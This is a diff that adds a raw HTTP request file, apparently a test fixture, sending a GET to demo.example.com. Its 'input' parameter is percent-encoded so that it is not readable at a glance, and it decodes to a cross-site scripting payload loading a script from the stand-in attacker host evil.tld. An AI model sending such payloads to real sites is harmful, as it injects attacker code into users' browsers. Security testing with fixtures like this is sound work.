@@ -1,0 +1,4 @@
+GET /a?input=%3C%73%63%72%69%70%74%20%73%72%63%3D%2F%2F%65%76%69%6C%2E%74%6C%64%2F%78%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
